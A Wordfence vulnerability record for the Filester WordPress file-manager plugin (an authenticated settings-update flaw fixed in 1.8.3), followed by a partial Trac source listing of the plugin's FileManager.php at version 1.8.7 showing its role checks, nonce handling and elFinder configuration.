[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Ffilester%2Ffile-manager-pro-filester-182-authenticated-plugin-settings-update&t=File%20Manager%20Pro%20%E2%80%93%20Filester%20%3C%3D%201.8.2%20-%20Authenticated%20Plugin%20Settings%20Update "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Ffilester%2Ffile-manager-pro-filester-182-authenticated-plugin-settings-update&text=File%20Manager%20Pro%20%E2%80%93%20Filester%20%3C%3D%201.8.2%20-%20Authenticated%20Plugin%20Settings%20Update "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Ffilester%2Ffile-manager-pro-filester-182-authenticated-plugin-settings-update "LinkedIn")
Email

## Vulnerability Details for File Manager Pro – Filester

#### [File Manager Pro – Filester](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/filester)

| Software Type | Plugin |
| --- | --- |
| Software Slug | filester [(view on wordpress.org)](https://wordpress.org/plugins/filester) |
| Patched? | Yes |
| Remediation | Update to version 1.8.3, or a newer patched version |
| Affected Version | * <= 1.8.2 |
| Patched Version | * 1.8.3 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_e367c027_20250111_080404.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Ffilester%2Ftrunk%2Fincludes%2FFile_manager%2FFileManager.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/filester/trunk/includes/File_manager/FileManager.php?rev=3196150 "Revision 3196150")
* Next Revision →
* [Blame](/browser/filester/trunk/includes/File_manager/FileManager.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/filester/trunk/includes/File_manager/FileManager.php)

---

# [source:](/browser?order=name "Go to repository root") [filester](/browser/filester?order=name "View filester")/[trunk](/browser/filester/trunk?order=name "View trunk")/[includes](/browser/filester/trunk/includes?order=name "View includes")/[File\_manager](/browser/filester/trunk/includes/File_manager?order=name "View File_manager")/[FileManager.php](/browser/filester/trunk/includes/File_manager/FileManager.php?order=name "View FileManager.php")

View diff against:

View revision:

| [Last change](/changeset/3208858/filester/trunk/includes/File_manager/FileManager.php "View differences") on this file was [3208858](/changeset/3208858/ "View changeset 3208858"), checked in by ninjateam, [4 weeks ago](/timeline?from=2024-12-17T03%3A44%3A40Z&precision=second "See timeline at 12/17/2024 03:44:40 AM") |
| --- |
| Version 1.8.7 |
| * Property **svn:eol-style** set to   *`native`* | |
| **File size:** 30.1 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | namespace NinjaFileManager\File\_manager; |
| [3](#L3) |  |
| [4](#L4) | defined('ABSPATH') || exit; |
| [5](#L5) |  |
| [6](#L6) | /\*\* |
| [7](#L7) | \* Settings Page |
| [8](#L8) | \*/ |
| [9](#L9) |  |
| [10](#L10) | class FileManager |
| [11](#L11) | { |
| [12](#L12) | protected static $instance = null; |
| [13](#L13) |  |
| [14](#L14) | /\*\* |
| [15](#L15) | \* |
| [16](#L16) | \* @var object $options The object of the options class |
| [17](#L17) | \* |
| [18](#L18) | \* \*/ |
| [19](#L19) | public $options; |
| [20](#L20) | public $fmCapability = ''; |
| [21](#L21) | public $userRole = ''; |
| [22](#L22) | private $hook\_suffix = array(); |
| [23](#L23) |  |
| [24](#L24) | public static function getInstance() |
| [25](#L25) | { |
| [26](#L26) | if (null == self::$instance) { |
| [27](#L27) | self::$instance = new self; |
| [28](#L28) | } |
| [29](#L29) |  |
| [30](#L30) | return self::$instance; |
| [31](#L31) | } |
| [32](#L32) |  |
| [33](#L33) | private function \_\_construct() |
| [34](#L34) | { |
| [35](#L35) | //get user role |
| [36](#L36) | $user = wp\_get\_current\_user(); |
| [37](#L37) | $this->userRole = $user && $user->roles && isset($user->roles[0]) ? $user->roles[0] : ''; |
| [38](#L38) |  |
| [39](#L39) | if ( empty($this->userRole) && isset($user->roles)) { |
| [40](#L40) | $role = ''; |
| [41](#L41) | foreach( $user->roles as $key => $value) { |
| [42](#L42) | $role = $value; |
| [43](#L43) | } |
| [44](#L44) |  |
| [45](#L45) | $this->userRole = $role; |
| [46](#L46) | } |
| [47](#L47) |  |
| [48](#L48) | // Loading Options |
| [49](#L49) | // Options |
| [50](#L50) | $this->options = get\_option('njt\_fs\_settings'); |
| [51](#L51) | if(empty($this->options)) { |
| [52](#L52) | $this->options = array( // Setting up default values |
| [53](#L53) | 'njt\_fs\_file\_manager\_settings' => array( |
| [54](#L54) | 'root\_folder\_path' =>  ABSPATH, |
| [55](#L55) | 'root\_folder\_url' => site\_url() |
| [56](#L56) | ), |
| [57](#L57) | ); |
| [58](#L58) | } |
| [59](#L59) | register\_shutdown\_function(array($this, 'saveOptions')); |
| [60](#L60) |  |
| [61](#L61) | add\_action('init', array($this, 'isAlowUserAccess')); |
| [62](#L62) | if ($this->isAlowUserAccess()) { |
| [63](#L63) | add\_action('admin\_enqueue\_scripts', array($this, 'enqueueAdminScripts')); |
| [64](#L64) | add\_action('admin\_menu', array($this, 'FileManager')); |
| [65](#L65) | add\_action('wp\_ajax\_fs\_connector', array($this, 'fsConnector')); |
| [66](#L66) | add\_action('wp\_ajax\_selector\_themes', array($this, 'selectorThemes')); |
| [67](#L67) | add\_action('wp\_ajax\_get\_role\_restrictions', array($this, 'getArrRoleRestrictions')); |
| [68](#L68) | add\_action('wp\_ajax\_njt\_fs\_save\_setting', array($this, 'njt\_fs\_saveSetting')); |
| [69](#L69) | add\_action('wp\_ajax\_njt\_fs\_save\_setting\_restrictions', array($this, 'njt\_fs\_saveSettingRestrictions')); |
| [70](#L70) |  |
| [71](#L71) | $optionReview = get\_option('njt\_fs\_review'); |
| [72](#L72) | if (time() >= (int)$optionReview && $optionReview !== '0'){ |
| [73](#L73) | add\_action('admin\_notices', array($this, 'njt\_fs\_give\_review')); |
| [74](#L74) | } |
| [75](#L75) |  |
| [76](#L76) | add\_action('wp\_ajax\_njt\_fs\_save\_review', array($this, 'njt\_fs\_save\_review')); |
| [77](#L77) | } |
| [78](#L78) | } |
| [79](#L79) |  |
| [80](#L80) | public function njt\_fs\_give\_review() |
| [81](#L81) | { |
| [82](#L82) | if (function\_exists('get\_current\_screen')) { |
| [83](#L83) | if (get\_current\_screen()->id == 'file-manager\_page\_filester-settings' || get\_current\_screen()->id == 'toplevel\_page\_njt-fs-filemanager' || get\_current\_screen()->id == 'plugins') { |
| [84](#L84) | $this->enqueue\_scripts(); |
| [85](#L85) | ?> |
| [86](#L86) | <div class="notice notice-success is-dismissible" id="njt-fs-review"> |
| [87](#L87) | <h3><?php \_e('Give Filester a review', 'filester')?></h3> |
| [88](#L88) | <p> |
| [89](#L89) | <?php \_e('Thank you for choosing Filester. We hope you love it. Could you take a couple of seconds posting a nice review to share your happy experience?', 'filester')?> |
| [90](#L90) | </p> |
| [91](#L91) | <p> |
| [92](#L92) | <?php \_e('We will be forever grateful. Thank you in advance ;)', 'filester')?> |
| [93](#L93) | </p> |
| [94](#L94) | <p> |
| [95](#L95) | <a href="javascript:;" data="rateNow" class="button button-primary" style="margin-right: 5px"><?php \_e('Rate now', 'filester')?></a> |
| [96](#L96) | <a href="javascript:;" data="later" class="button" style="margin-right: 5px"><?php \_e('Later', 'filester')?></a> |
| [97](#L97) | <a href="javascript:;" data="alreadyDid" class="button"><?php \_e('Already did', 'filester')?></a> |
| [98](#L98) | </p> |
| [99](#L99) | </div> |
| [100](#L100) | <?php |
| [101](#L101) | } |
| [102](#L102) | } |
| [103](#L103) | } |
| [104](#L104) |  |
| [105](#L105) | public function njt\_fs\_save\_review() |
| [106](#L106) | { |
| [107](#L107) | if ( isset( $\_POST ) ) { |
| [108](#L108) | $nonce = isset( $\_POST['nonce'] ) ? sanitize\_text\_field( $\_POST['nonce'] ) : null; |
| [109](#L109) | $field = isset( $\_POST['field'] ) ? sanitize\_text\_field( $\_POST['field'] ) : null; |
| [110](#L110) |  |
| [111](#L111) | if ( ! wp\_verify\_nonce( $nonce, 'njt-fs-review' ) ) { |
| [112](#L112) | wp\_send\_json\_error( array( 'status' => 'Wrong nonce validate!' ) ); |
| [113](#L113) | exit(); |
| [114](#L114) | } |
| [115](#L115) |  |
| [116](#L116) | if ($field == 'later'){ |
| [117](#L117) | update\_option('njt\_fs\_review', time() + 3\*60\*60\*24); //After 3 days show |
| [118](#L118) | } else if ($field == 'alreadyDid'){ |
| [119](#L119) | update\_option('njt\_fs\_review', 0); |
| [120](#L120) | } |
| [121](#L121) | wp\_send\_json\_success(); |
| [122](#L122) | } |
| [123](#L123) | wp\_send\_json\_error( array( 'message' => 'Update fail!' ) ); |
| [124](#L124) | } |
| [125](#L125) |  |
| [126](#L126) | public function enqueue\_scripts(){ |
| [127](#L127) | wp\_enqueue\_script('njt-fs-review', NJT\_FS\_BN\_PLUGIN\_URL . 'assets/js/review.js', array('jquery'), NJT\_FS\_BN\_VERSION, false); |
| [128](#L128) | wp\_localize\_script('njt-fs-review', 'wpDataFs', array( |
| [129](#L129) | 'admin\_ajax' => admin\_url('admin-ajax.php'), |
| [130](#L130) | 'nonce' => wp\_create\_nonce("njt-fs-review"), |
| [131](#L131) | )); |
| [132](#L132) | } |
| [133](#L133) |  |
| [134](#L134) | public function isAlowUserAccess() |
| [135](#L135) | { |
| [136](#L136) | if($this->userRole) { |
| [137](#L137) | $allowed\_roles = !empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_alow\_access']) ? $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_alow\_access'] : array(); |
| [138](#L138) | if( in\_array($this->userRole,$allowed\_roles)) { |
| [139](#L139) | if (is\_multisite() && $this->userRole == 'administrator') { |
| [140](#L140) | $this->fmCapability = 'activate\_plugins'; |
| [141](#L141) | } |
| [142](#L142) | $this->fmCapability = $this->userRole; |
| [143](#L143) | return true; |
| [144](#L144) | } |
| [145](#L145) | } |
| [146](#L146) | if (is\_multisite() && is\_super\_admin()) { |
| [147](#L147) | $this->fmCapability = 'create\_sites'; |
| [148](#L148) | return true; |
| [149](#L149) | } |
| [150](#L150) |  |
| [151](#L151) | if (!is\_multisite() && is\_super\_admin()) { |
| [152](#L152) | $this->fmCapability = 'administrator'; |
| [153](#L153) | return true; |
| [154](#L154) | } |
| [155](#L155) | $this->fmCapability = 'read'; |
| [156](#L156) | return false; |
| [157](#L157) | } |
| [158](#L158) |  |
| [159](#L159) | public function FileManager() |
| [160](#L160) | { |
| [161](#L161) | if( class\_exists( 'NestedPages' ) ) { |
| [162](#L162) | $this->fmCapability = 'read'; |
| [163](#L163) | } |
| [164](#L164) | $icon = 'data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEwLDRINEMyLjg5LDQgMiw0Ljg5IDIsNlYxOEEyLDIgMCAwLDAgNCwyMEgyMEEyLDIgMCAwLDAgMjIsMThWOEMyMiw2Ljg5IDIxLjEsNiAyMCw2SDEyTDEwLDRaIiBmaWxsPSIjYTdhYWFkIi8+PC9zdmc+'; |
| [165](#L165) | $display\_suffix = add\_menu\_page( |
| [166](#L166) | \_\_('Filester', 'textdomain'), |
| [167](#L167) | 'File Manager', |
| [168](#L168) | $this->fmCapability, |
| [169](#L169) | 'njt-fs-filemanager', |
| [170](#L170) | array($this, 'fsViewFileCallback'), |
| [171](#L171) | $icon, |
| [172](#L172) | 9 |
| [173](#L173) | ); |
| [174](#L174) | if (is\_multisite()) { |
| [175](#L175) | $settings\_suffix = add\_submenu\_page ( |
| [176](#L176) | 'njt-fs-filemanager', |
| [177](#L177) | 'Settings', |
| [178](#L178) | 'Settings', |
| [179](#L179) | 'create\_sites', |
| [180](#L180) | 'filester-settings', |
| [181](#L181) | array($this, 'fsSettingsPage') ); |
| [182](#L182) | } |
| [183](#L183) |  |
| [184](#L184) | if (!is\_multisite()) { |
| [185](#L185) | $settings\_suffix = add\_submenu\_page ( |
| [186](#L186) | 'njt-fs-filemanager', |
| [187](#L187) | 'Settings', |
| [188](#L188) | 'Settings', |
| [189](#L189) | 'manage\_options', |
| [190](#L190) | 'filester-settings', |
| [191](#L191) | array($this, 'fsSettingsPage') ); |
| [192](#L192) | } |
| [193](#L193) |  |
| [194](#L194) | $this->hook\_suffix = array($display\_suffix, $settings\_suffix); |
| [195](#L195) | } |
| [196](#L196) |  |
| [197](#L197) | public function fsViewFileCallback() |
| [198](#L198) | { |
| [199](#L199) | $viewPath = NJT\_FS\_BN\_PLUGIN\_PATH . 'views/pages/html-filemanager.php'; |
| [200](#L200) | include\_once $viewPath; |
| [201](#L201) | } |
| [202](#L202) |  |
| [203](#L203) | public function fsSettingsPage() |
| [204](#L204) | { |
| [205](#L205) | $viewPath = NJT\_FS\_BN\_PLUGIN\_PATH . 'views/pages/html-filemanager-settings.php'; |
| [206](#L206) | include\_once $viewPath; |
| [207](#L207) | } |
| [208](#L208) |  |
| [209](#L209) | public function enqueueAdminScripts($suffix) |
| [210](#L210) | { |
| [211](#L211) | if (in\_array($suffix, $this->hook\_suffix)) { |
| [212](#L212) | $selectorThemes = get\_option('njt\_fs\_selector\_themes'); |
| [213](#L213) | if (empty($selectorThemes[$this->userRole])) { |
| [214](#L214) | $selectorThemes[$this->userRole]['themesValue'] = 'Default'; |
| [215](#L215) | update\_option('njt\_fs\_selector\_themes', $selectorThemes); |
| [216](#L216) | } |
| [217](#L217) |  |
| [218](#L218) | $selectedTheme = $selectorThemes[$this->userRole]['themesValue']; |
| [219](#L219) |  |
| [220](#L220) | //elfinder css |
| [221](#L221) | wp\_enqueue\_style('elfinder.jq.css', plugins\_url('/lib/jquery/jquery-ui.min.css', \_\_FILE\_\_)); |
| [222](#L222) | wp\_enqueue\_style('elfinder.full.css', plugins\_url('/lib/css/elfinder.min.css', \_\_FILE\_\_)); |
| [223](#L223) | wp\_enqueue\_style('themes', plugins\_url('/lib/css/theme.css', \_\_FILE\_\_)); |
| [224](#L224) | wp\_enqueue\_style('themes-selector', plugins\_url('/lib/themes/' . $selectedTheme . '/css/theme.css', \_\_FILE\_\_)); |
| [225](#L225) |  |
| [226](#L226) | //elfinder core |
| [227](#L227) | if(version\_compare(get\_bloginfo('version'),'5.6', '>=') ){ |
| [228](#L228) | wp\_enqueue\_script('jquery\_min', plugins\_url('/lib/jquery/jquery-ui.min.js', \_\_FILE\_\_)); |
| [229](#L229) | } else { |
| [230](#L230) | wp\_enqueue\_script('jquery\_min', plugins\_url('/lib/jquery/jquery-ui-old.min.js', \_\_FILE\_\_)); |
| [231](#L231) | } |
| [232](#L232) |  |
| [233](#L233) | //elfinder js, toastr JS, css custom |
| [234](#L234) | wp\_register\_style('njt\_fs\_toastr\_css',NJT\_FS\_BN\_PLUGIN\_URL . 'assets/js/toastr/toastr.min.css'); |
| [235](#L235) | wp\_enqueue\_style('njt\_fs\_toastr\_css'); |
| [236](#L236) | wp\_enqueue\_script('njt\_fs\_toastr\_js', NJT\_FS\_BN\_PLUGIN\_URL . 'assets/js/toastr/toastr.min.js', array('jquery'), NJT\_FS\_BN\_VERSION); |
| [237](#L237) |  |
| [238](#L238) | wp\_register\_style('file\_manager\_admin\_css',NJT\_FS\_BN\_PLUGIN\_URL . 'assets/css/file\_manager\_admin.css'); |
| [239](#L239) | wp\_enqueue\_style('file\_manager\_admin\_css'); |
| [240](#L240) | wp\_enqueue\_script('file\_manager\_admin', NJT\_FS\_BN\_PLUGIN\_URL . 'assets/js/file\_manager\_admin.js', array('jquery'), NJT\_FS\_BN\_VERSION, true); |
| [241](#L241) |  |
| [242](#L242) | //js load elFinder |
| [243](#L243) | wp\_enqueue\_script('njt\_fs\_elFinder', plugins\_url('/lib/js/elfinder.min.js', \_\_FILE\_\_)); |
| [244](#L244) |  |
| [245](#L245) | wp\_enqueue\_script('njt\_fs\_elfinder\_editor', plugins\_url('/lib/js/extras/editors.default.js', \_\_FILE\_\_)); |
| [246](#L246) | //js load fm\_locale |
| [247](#L247) | if(isset($this->options['njt\_fs\_file\_manager\_settings']['fm\_locale'])) { |
| [248](#L248) | $locale = $this->options['njt\_fs\_file\_manager\_settings']['fm\_locale']; |
| [249](#L249) | if( !empty($locale) &&  $locale != 'en' && in\_array($locale, njt\_fs\_locales(), true)) { |
| [250](#L250) | $locale = sanitize\_file\_name($locale); |
| [251](#L251) | wp\_enqueue\_script( 'njt\_fs\_fma\_lang', plugins\_url('lib/js/i18n/elfinder.'.$locale.'.js', \_\_FILE\_\_)); |
| [252](#L252) | } |
| [253](#L253) | } |
| [254](#L254) |  |
| [255](#L255) | wp\_localize\_script('njt\_fs\_elFinder', 'wpData', array( |
| [256](#L256) | 'admin\_ajax' => admin\_url('admin-ajax.php'), |
| [257](#L257) | 'nonce' => wp\_create\_nonce("njt-fs-file-manager-admin"), |
| [258](#L258) | 'PLUGIN\_URL' => NJT\_FS\_BN\_PLUGIN\_URL .'includes/File\_manager/lib/', |
| [259](#L259) | 'PLUGIN\_PATH' => NJT\_FS\_BN\_PLUGIN\_PATH.'includes/File\_manager/lib/', |
| [260](#L260) | 'PLUGIN\_DIR'=> NJT\_FS\_BN\_PLUGIN\_DIR, |
| [261](#L261) | 'ABSPATH'=> str\_replace("\\", "/", ABSPATH), |
| [262](#L262) | 'is\_multisite' => is\_multisite(), |
| [263](#L263) | 'lang' => !empty( $this->options['njt\_fs\_file\_manager\_settings']['fm\_locale']) ? sanitize\_file\_name($this->options['njt\_fs\_file\_manager\_settings']['fm\_locale']) : '', |
| [264](#L264) | 'nonce\_connector' => wp\_create\_nonce('file-manager-security-token'), |
| [265](#L265) | )); |
| [266](#L266) | } |
| [267](#L267) | } |
| [268](#L268) |  |
| [269](#L269) | //File manager connector function |
| [270](#L270) |  |
| [271](#L271) | public function fsConnector() |
| [272](#L272) | { |
| [273](#L273) | check\_ajax\_referer( 'file-manager-security-token', 'nonce' ); |
| [274](#L274) | $uploadMaxSize = isset($this->options['njt\_fs\_file\_manager\_settings']['upload\_max\_size']) && !empty($this->options['njt\_fs\_file\_manager\_settings']['upload\_max\_size']) ? $this->options['njt\_fs\_file\_manager\_settings']['upload\_max\_size'] : 0; |
| [275](#L275) |  |
| [276](#L276) | $opts = array( |
| [277](#L277) | 'bind' => array( |
| [278](#L278) | 'put.pre' => array(new \FileManagerHelper, 'madeStripcslashesFile'), // Check endcode when save file. |
| [279](#L279) | ), |
| [280](#L280) | 'debug' => false, |
| [281](#L281) | 'roots' => array( |
| [282](#L282) | array( |
| [283](#L283) | 'driver' => 'LocalFileSystem', |
| [284](#L284) | 'path' => isset($this->options['njt\_fs\_file\_manager\_settings']['root\_folder\_path']) && !empty($this->options['njt\_fs\_file\_manager\_settings']['root\_folder\_path']) ? $this->options['njt\_fs\_file\_manager\_settings']['root\_folder\_path'] : ABSPATH, |
| [285](#L285) | 'URL' => isset($this->options['njt\_fs\_file\_manager\_settings']['root\_folder\_url']) && !empty($this->options['njt\_fs\_file\_manager\_settings']['root\_folder\_url']) ? $this->options['njt\_fs\_file\_manager\_settings']['root\_folder\_url'] : site\_url(), |
| [286](#L286) | 'trashHash'     => '', // default is empty, when not enable trash |
| [287](#L287) | 'uploadMaxSize' =>  $uploadMaxSize .'M', |
| [288](#L288) | 'winHashFix'    => DIRECTORY\_SEPARATOR !== '/', |
| [289](#L289) | 'uploadOrder'   => array('deny', 'allow'), |
| [290](#L290) | 'disabled' => array(''), |
| [291](#L291) | //'acceptedName' => 'validName', |
| [292](#L292) | 'attributes' => array() // default is empty |
| [293](#L293) | ), |
| [294](#L294) | ), |
| [295](#L295) | ); |
| [296](#L296) |  |
| [297](#L297) | // .htaccess |
| [298](#L298) | if(isset($this->options['njt\_fs\_file\_manager\_settings']['enable\_htaccess']) && ($this->options['njt\_fs\_file\_manager\_settings']['enable\_htaccess'] == '1')) { |
| [299](#L299) | $attributes = array( |
| [300](#L300) | 'pattern' => '/.htaccess/', |
| [301](#L301) | 'read' => false, |
| [302](#L302) | 'write' => false, |
| [303](#L303) | 'hidden' => true, |
| [304](#L304) | 'locked' => false |
| [305](#L305) | ); |
| [306](#L306) | array\_push($opts['roots'][0]['attributes'], $attributes); |
| [307](#L307) | } |
| [308](#L308) |  |
| [309](#L309) | //Enable Trash |
| [310](#L310) | if(isset($this->options['njt\_fs\_file\_manager\_settings']['enable\_trash']) && ($this->options['njt\_fs\_file\_manager\_settings']['enable\_trash'] == '1')) { |
| [311](#L311) | $trash = array( |
| [312](#L312) | 'id'            => '1', |
| [313](#L313) | 'driver'        => 'Trash', |
| [314](#L314) | 'path'          => NJT\_FS\_BN\_PLUGIN\_PATH.'includes/File\_manager/lib/files/.trash/', |
| [315](#L315) | 'tmbURL'        => site\_url() . '/includes/File\_manager/lib/files/.trash/.tmb', |
| [316](#L316) | 'winHashFix'    => DIRECTORY\_SEPARATOR !== '/', |
| [317](#L317) | 'uploadDeny'    => array('htaccess'), |
| [318](#L318) | 'uploadAllow'   => array('all'), |
| [319](#L319) | 'uploadOrder'   => array('deny', 'allow'), |
| [320](#L320) | 'acceptedName' => 'validName', |
| [321](#L321) | 'attributes' => array( |
| [322](#L322) | array( |
| [323](#L323) | 'pattern' => '/.tmb/', |
| [324](#L324) | 'read' => false, |
| [325](#L325) | 'write' => false, |
| [326](#L326) | 'hidden' => true, |
| [327](#L327) | 'locked' => false |
| [328](#L328) | ), |
| [329](#L329) | array( |
| [330](#L330) | 'pattern' => '/.gitkeep/', |
| [331](#L331) | 'read' => false, |
| [332](#L332) | 'write' => false, |
| [333](#L333) | 'hidden' => true, |
| [334](#L334) | 'locked' => false |
| [335](#L335) | ) |
| [336](#L336) | ) |
| [337](#L337) | ); |
| [338](#L338) | $opts['roots'][0]['trashHash'] = 't1\_Lw'; |
| [339](#L339) | $opts['roots'][1] = $trash; |
| [340](#L340) | } |
| [341](#L341) |  |
| [342](#L342) | //Start --setting User Role Restrictions |
| [343](#L343) | $user = wp\_get\_current\_user(); |
| [344](#L344) | $userRoles =  $user && $user->roles && $user->roles[0] ? $user->roles[0] : ''; |
| [345](#L345) |  |
| [346](#L346) | //Disable Operations |
| [347](#L347) | if(!empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['list\_user\_restrictions\_alow\_access'])){ |
| [348](#L348) | $opts['roots'][0]['disabled'] = $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['list\_user\_restrictions\_alow\_access']; |
| [349](#L349) | } |
| [350](#L350) | //Creat root path for user |
| [351](#L351) | if(!empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['private\_folder\_access'])){ |
| [352](#L352) | $opts['roots'][0]['path'] = $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['private\_folder\_access'] .'/'; |
| [353](#L353) | } |
| [354](#L354) |  |
| [355](#L355) | //Creat url root path for user |
| [356](#L356) | if(!empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['private\_url\_folder\_access'])){ |
| [357](#L357) | $opts['roots'][0]['URL'] = $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['private\_url\_folder\_access'] .'/'; |
| [358](#L358) | } |
| [359](#L359) |  |
| [360](#L360) | //Folder or File Paths That You want to Hide |
| [361](#L361) | if(!empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['hide\_paths'])){ |
| [362](#L362) | foreach ($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['hide\_paths'] as $key => $value){ |
| [363](#L363) | $arrItemHidePath =  array( |
| [364](#L364) | 'pattern' => '~/'.$value.'~', |
| [365](#L365) | 'read' => false, |
| [366](#L366) | 'write' => false, |
| [367](#L367) | 'hidden' => true, |
| [368](#L368) | 'locked' => false |
| [369](#L369) | ); |
| [370](#L370) | array\_push($opts['roots'][0]['attributes'], $arrItemHidePath); |
| [371](#L371) | }; |
| [372](#L372) | } |
| [373](#L373) |  |
| [374](#L374) | //File extensions which you want to Lock |
| [375](#L375) | if(!empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['lock\_files'])){ |
| [376](#L376) | foreach ($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['lock\_files'] as $key => $value){ |
| [377](#L377) | $arrItemLockFile =  array( |
| [378](#L378) | 'pattern' => '/'.$value.'/', |
| [379](#L379) | 'read' => false, |
| [380](#L380) | 'write' => false, |
| [381](#L381) | 'hidden' => false, |
| [382](#L382) | 'locked' => true |
| [383](#L383) | ); |
| [384](#L384) | array\_push($opts['roots'][0]['attributes'], $arrItemLockFile); |
| [385](#L385) | }; |
| [386](#L386) | } |
| [387](#L387) |  |
| [388](#L388) | //Enter file extensions which can be uploaded |
| [389](#L389) | $flag = false; |
| [390](#L390) |  |
| [391](#L391) |  |
| [392](#L392) | if (is\_multisite()) { |
| [393](#L393) | if( !current\_user\_can('create\_sites') && empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['can\_upload\_mime'])) { |
| [394](#L394) | $opts['roots'][0]['uploadDeny'] = array('all'); |
| [395](#L395) | $opts['roots'][0]['uploadAllow'] = array(''); |
| [396](#L396) | } else if ( !current\_user\_can('create\_sites') && !empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['can\_upload\_mime'])) { |
| [397](#L397) | $opts['roots'][0]['uploadDeny'] = array('all'); |
| [398](#L398) | $opts['roots'][0]['uploadAllow'] = array(); |
